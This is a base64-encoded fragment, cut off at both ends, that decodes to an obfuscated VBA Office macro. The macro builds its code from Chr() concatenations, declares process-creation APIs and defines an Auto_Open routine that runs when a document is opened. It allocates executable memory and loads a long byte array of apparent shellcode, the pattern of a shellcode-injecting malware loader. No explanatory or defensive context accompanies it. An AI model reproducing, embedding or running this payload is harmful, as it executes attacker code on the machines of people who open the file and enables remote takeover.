SZDaHIoNzYpJkNocigxMDUpJiBfDQpDaHIoMTEwKSZDaHIoMTAxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoODMpJkNocigxMTYpJkNocigxMTQpJkNocigxMDUpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDY1KSZDaHIoMTE2KSZDaHIoMTE2KSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoOTgpJkNocigxMTcpJkNocigxMTYpJkNocigxMDEpJiBfDQpDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTApJkNocigxMjEpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODQpJkNocigxMDQpJkNocigxMTQpJkNocigxMDEpJkNocig5NykmQ2hyKDEwMCkmQ2hyKDY1KSZDaHIoMTE2KSZDaHIoMTE2KSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoOTgpJkNocigxMTcpJkNocigxMTYpJkNocigxMDEpJkNocigxMTUpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJiBfDQpDaHIoNjUpJkNocigxMTApJkNocigxMjEpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocig5OCkmQ2hyKDczKSZDaHIoMTEwKSZDaHIoMTA0KSZDaHIoMTAxKSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE2KSZDaHIoNzIpJkNocig5NykmQ2hyKDExMCkmQ2hyKDEwMCkmQ2hyKDEwOCkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSYgXw0KQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwMCkmQ2hyKDExOSkmQ2hyKDY3KSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoOTcpJkNocigxMTYpJkNocigxMDUpJkNocigxMTEpJkNocigxMTApJkNocig3MCkmQ2hyKDEwOCkmQ2hyKDk3KSZDaHIoMTAzKSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJiBfDQpDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDExMikmQ2hyKDY5KSZDaHIoMTEwKSZDaHIoMTE4KSZDaHIoMTA1KSZDaHIoMTE0KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTA5KSZDaHIoMTAxKSZDaHIoMTEwKSZDaHIoMTE2KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTApJkNocigxMjEpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDgpJiBfDQpDaHIoMTEyKSZDaHIoNjcpJkNocigxMTcpJkNocigxMTQpJkNocigxMTQpJkNocigxMDEpJkNocigxMTApJkNocigxMTYpJkNocig2OCkmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDEwMSkmQ2hyKDk5KSZDaHIoMTE2KSZDaHIoMTExKSZDaHIoMTE0KSZDaHIoMTIxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoODMpJkNocigxMTYpJkNocigxMTQpJkNocigxMDUpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODMpJiBfDQpDaHIoMTE2KSZDaHIoOTcpJkNocigxMTQpJkNocigxMTYpJkNocigxMTcpJkNocigxMTIpJkNocig3MykmQ2hyKDExMCkmQ2hyKDEwMikmQ2hyKDExMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDgzKSZDaHIoODQpJkNocig2NSkmQ2hyKDgyKSZDaHIoODQpJkNocig4NSkmQ2hyKDgwKSZDaHIoNzMpJkNocig3OCkmQ2hyKDcwKSZDaHIoNzkpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJiBfDQpDaHIoOTkpJkNocigxMDEpJkNocigxMTUpJkNocigxMTUpJkNocig3MykmQ2hyKDExMCkmQ2hyKDEwMikmQ2hyKDExMSkmQ2hyKDExNCkmQ2hyKDEwOSkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoODApJkNocig4MikmQ2hyKDc5KSZDaHIoNjcpJkNocig2OSkmQ2hyKDgzKSZDaHIoODMpJkNocig5NSkmQ2hyKDczKSZDaHIoNzgpJkNocig3MCkmQ2hyKDc5KSZDaHIoODIpJiBfDQpDaHIoNzcpJkNocig2NSkmQ2hyKDg0KSZDaHIoNzMpJkNocig3OSkmQ2hyKDc4KSZDaHIoNDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMzUpJkNocig2OSkmQ2hyKDExMCkmQ2hyKDEwMCkmQ2hyKDMyKSZDaHIoNzMpJkNocigxMDIpJkNocigxMCkmQ2hyKDEwKSZDaHIoODMpJkNocigxMTcpJkNocig5OCkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTcpJkNocigxMTYpJiBfDQpDaHIoMTExKSZDaHIoOTUpJkNocig3OSkmQ2hyKDExMikmQ2hyKDEwMSkmQ2hyKDExMCkmQ2hyKDQwKSZDaHIoNDEpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoNjgpJkNocigxMDUpJkNocigxMDkpJkNocigzMikmQ2hyKDEwOSkmQ2hyKDEyMSkmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmIF8NCkNocigzMikmQ2hyKDEwOSkmQ2hyKDEyMSkmQ2hyKDY1KSZDaHIoMTE0KSZDaHIoMTE0KSZDaHIoOTcpJkNocigxMjEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4NikmQ2hyKDk3KSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoOTcpJkNocigxMTApJkNocigxMTYpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTExKSZDaHIoMTAyKSZDaHIoMTAyKSZDaHIoMTE1KSZDaHIoMTAxKSZDaHIoMTE2KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJiBfDQpDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDY4KSZDaHIoMTA1KSZDaHIoMTA5KSZDaHIoMzIpJkNocigxMTIpJkNocig3MykmQ2hyKDExMCkmQ2hyKDEwMikmQ2hyKDExMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDgwKSZDaHIoODIpJkNocig3OSkmQ2hyKDY3KSZDaHIoNjkpJkNocig4MykmQ2hyKDgzKSZDaHIoOTUpJkNocig3MykmQ2hyKDc4KSZDaHIoNzApJiBfDQpDaHIoNzkpJkNocig4MikmQ2hyKDc3KSZDaHIoNjUpJkNocig4NCkmQ2hyKDczKSZDaHIoNzkpJkNocig3OCkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocig2OCkmQ2hyKDEwNSkmQ2hyKDEwOSkmQ2hyKDMyKSZDaHIoMTE1KSZDaHIoNzMpJkNocigxMTApJkNocigxMDIpJkNocigxMTEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDg0KSZDaHIoNjUpJkNocig4MikmQ2hyKDg0KSZDaHIoODUpJiBfDQpDaHIoODApJkNocig3MykmQ2hyKDc4KSZDaHIoNzApJkNocig3OSkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocig2OCkmQ2hyKDEwNSkmQ2hyKDEwOSkmQ2hyKDMyKSZDaHIoMTE1KSZDaHIoNzgpJkNocigxMTcpJkNocigxMDgpJkNocigxMDgpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmIF8NCkNocigzMikmQ2hyKDMyKSZDaHIoNjgpJkNocigxMDUpJkNocigxMDkpJkNocigzMikmQ2hyKDExNSkmQ2hyKDgwKSZDaHIoMTE0KSZDaHIoMTExKSZDaHIoOTkpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMTApJkNocigzNSkmQ2hyKDczKSZDaHIoMTAyKSZDaHIoMzIpJkNocig4NikmQ2hyKDY2KSZDaHIoNjUpJkNocig1NSkmQ2hyKDMyKSYgXw0KQ2hyKDg0KSZDaHIoMTA0KSZDaHIoMTAxKSZDaHIoMTEwKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDY4KSZDaHIoMTA1KSZDaHIoMTA5KSZDaHIoMzIpJkNocigxMTQpJkNocigxMTkpJkNocigxMjApJkNocigxMTIpJkNocig5NykmQ2hyKDEwMykmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoODApJkNocigxMTYpJkNocigxMTQpJkNocig0NCkmIF8NCkNocigzMikmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoODApJkNocigxMTYpJkNocigxMTQpJkNocigxMCkmQ2hyKDM1KSZDaHIoNjkpJkNocigxMDgpJkNocigxMTUpJkNocigxMDEpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoNjgpJkNocigxMDUpJkNocigxMDkpJkNocigzMikmQ2hyKDExNCkmQ2hyKDExOSkmIF8NCkNocigxMjApJkNocigxMTIpJkNocig5NykmQ2hyKDEwMykmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzNSkmQ2hyKDY5KSZDaHIoMTEwKSZDaHIoMTAwKSZDaHIoMzIpJiBfDQpDaHIoNzMpJkNocigxMDIpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTA5KSZDaHIoMTIxKSZDaHIoNjUpJkNocigxMTQpJkNocigxMTQpJkNocig5NykmQ2hyKDEyMSkmQ2hyKDMyKSZDaHIoNjEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE0KSZDaHIoMTE0KSZDaHIoOTcpJkNocigxMjEpJkNocig0MCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTApJkNocig1MikmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmIF8NCkNocig0OSkmQ2hyKDU3KSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig1NykmQ2hyKDU0KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MCkmQ2hyKDU1KSZDaHIoNDQpJkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUyKSZDaHIoNTQpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig0OCkmQ2hyKDQ0KSYgXw0KQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig1NikmQ2hyKDUwKSZDaHIoNDQpJkNocig1MikmQ2hyKDU2KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTUpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTApJkNocig0NCkmQ2hyKDUwKSZDaHIoNDgpJiBfDQpDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDUyKSZDaHIoNDQpJkNocig1MikmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OSkmQ2hyKDUzKSZDaHIoNDQpJkNocig0NSkmQ2hyKDU1KSZDaHIoNTEpJkNocig0NCkmQ2hyKDU1KSZDaHIoNTIpJkNocig0NCkmQ2hyKDUxKSZDaHIoNTYpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmIF8NCkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmQ2hyKDU0KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTYpJkNocig1MikmQ2hyKDQ0KSZDaHIoMzIpJkNocig5NSkmQ2hyKDEwKSZDaHIoNTQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTcpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig1MCkmQ2hyKDUyKSZDaHIoNDQpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTIpJkNocig1MikmQ2hyKDQ0KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSYgXw0KQ2hyKDQ1KSZDaHIoNTQpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig0OSkmQ2hyKDUxKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MykmQ2hyKDU1KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUxKSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDUpJiBfDQpDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig1NikmQ2hyKDUwKSZDaHIoNDQpJkNocig0OSkmQ2hyKDU0KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTQpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1NikmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTUpJkNocig0NCkmIF8NCkNocig1NCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0OSkmQ2hyKDUwKSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig1MCkmQ2hyKDUxKSZDaHIoNDQpJkNocig0NSkmQ2hyKDU0KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTUpJkNocig1MikmQ2hyKDQ0KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1NikmQ2hyKDQ0KSZDaHIoMzIpJkNocig5NSkmQ2hyKDEwKSYgXw0KQ2hyKDU2KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig1NSkmQ2hyKDUwKSZDaHIoNDQpJkNocig1MCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1MykmQ2hyKDQ0KSZDaHIoNDUpJiBfDQpDaHIoNTApJkNocig1NykmQ2hyKDQ0KSZDaHIoNTQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTUpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTUpJkNocig0NCkmQ2hyKDUzKSZDaHIoNTApJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MikmQ2hyKDUwKSZDaHIoNDQpJkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmIF8NCkNocig0OSkmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDUpJkNocig1NCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0NSkmQ2hyKDU2KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTQpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig0OSkmQ2hyKDUxKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MykmQ2hyKDU1KSZDaHIoNDQpJkNocig1MykmQ2hyKDU0KSYgXw0KQ2hyKDQ0KSZDaHIoNDUpJkNocig1MSkmQ2hyKDUwKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTUpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTEpJkNocig0NCkmQ2hyKDMyKSZDaHIoOTUpJkNocigxMCkmQ2hyKDQ5KSZDaHIoNTApJkNocig1MykmQ2hyKDQ0KSZDaHIoNDUpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTMpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDkpJkNocig1MCkmQ2hyKDUzKSZDaHIoNDQpJiBfDQpDaHIoNTEpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUxKSZDaHIoNDgpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1MSkmQ2hyKDU0KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MikmQ2hyKDUzKSZDaHIoNDQpJkNocig0OSkmIF8NCkNocig0OCkmQ2hyKDUwKSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTUpJkNocig1MykmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTUpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDUwKSZDaHIoNTYpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUyKSZDaHIoNTMpJkNocig0NCkmQ2hyKDQ1KSYgXw0KQ2hyKDQ5KSZDaHIoNDkpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MikmQ2hyKDU2KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NykmQ2hyKDQ0KSZDaHIoNTQpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTEpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTEpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTcpJiBfDQpDaHIoNDkpJkNocig0NCkmQ2hyKDMyKSZDaHIoOTUpJkNocigxMCkmQ2hyKDU3KSZDaHIoNDkpJkNocig0NCkmQ2hyKDU3KSZDaHIoNTUpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTcpJkNocig0NCkmQ2hyKDU3KSZDaHIoNDgpJkNocig0NCkmQ2hyKDU2KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTcpJkNocig1MykmIF8NCkNocig0NCkmQ2hyKDU3KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig0OSkmQ2hyKDU2KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUwKSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig1MCkmQ2hyKDUwKSZDaHIoNDQpJkNocig1NykmQ2hyKDUxKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig0OCkmQ2hyKDQ0KSYgXw0KQ2hyKDQ5KSZDaHIoNDgpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU0KSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1MykmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTMpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTIpJiBfDQpDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTIpJkNocig0NCkmQ2hyKDU1KSZDaHIoNTQpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NykmQ2hyKDQ0KSZDaHIoNTEpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTUpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmQ2hyKDMyKSZDaHIoOTUpJkNocigxMCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0NSkmIF8NCkNocig0OSkmQ2hyKDUwKSZDaHIoNTYpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDU1KSZDaHIoNTUpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig1MCkmQ2hyKDUwKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTMpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1NikmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDU2KSYgXw0KQ2hyKDQ0KSZDaHIoNTcpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTMpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTIpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUzKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNDgpJiBfDQpDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU3KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTMpJkNocig0NCkmQ2hyKDUxKSZDaHIoNTApJkNocig0NCkmQ2hyKDU1KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTIpJkNocig0NCkmQ2hyKDUxKSZDaHIoNTApJkNocig0NCkmQ2hyKDUzKSZDaHIoNTIpJkNocig0NCkmIF8NCkNocig1MikmQ2hyKDU0KSZDaHIoNDQpJkNocigzMikmQ2hyKDk1KSZDaHIoMTApJkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig1MykmQ2hyKDU3KSZDaHIoNDQpJkNocig1MSkmQ2hyKDUwKSZDaHIoNDQpJkNocig1NikmQ2hyKDU1KSZDaHIoNDQpJkNocig1NSkmQ2hyKDU3KSZDaHIoNDQpJkNocig1NikmQ2hyKDU1KSZDaHIoNDQpJkNocig1MykmQ2hyKDUyKSZDaHIoNDQpJkNocig1MykmQ2hyKDUwKSZDaHIoNDQpJkNocig1MykmQ2hyKDU3KSYgXw0KQ2hyKDQ0KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1MikmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDUyKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTMpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTIpJiBfDQpDaHIoNTUpJkNocig0NCkmQ2hyKDUzKSZDaHIoNTMpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTQpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTYpJkNocig0NCkmQ2hyKDUzKSZDaHIoNTcpJkNocig0NCkmQ2hyKDUxKSZDaHIoNTApJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1MikmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU2KSZDaHIoNDQpJkNocig1MykmQ2hyKDU2KSZDaHIoNDQpJkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig1MikmIF8NCkNocig1NykmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTIpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSZDaHIoMzIpJkNocig5NSkmQ2hyKDEwKSZDaHIoNDkpJkNocig0OCkmQ2hyKDU2KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTMpJkNoci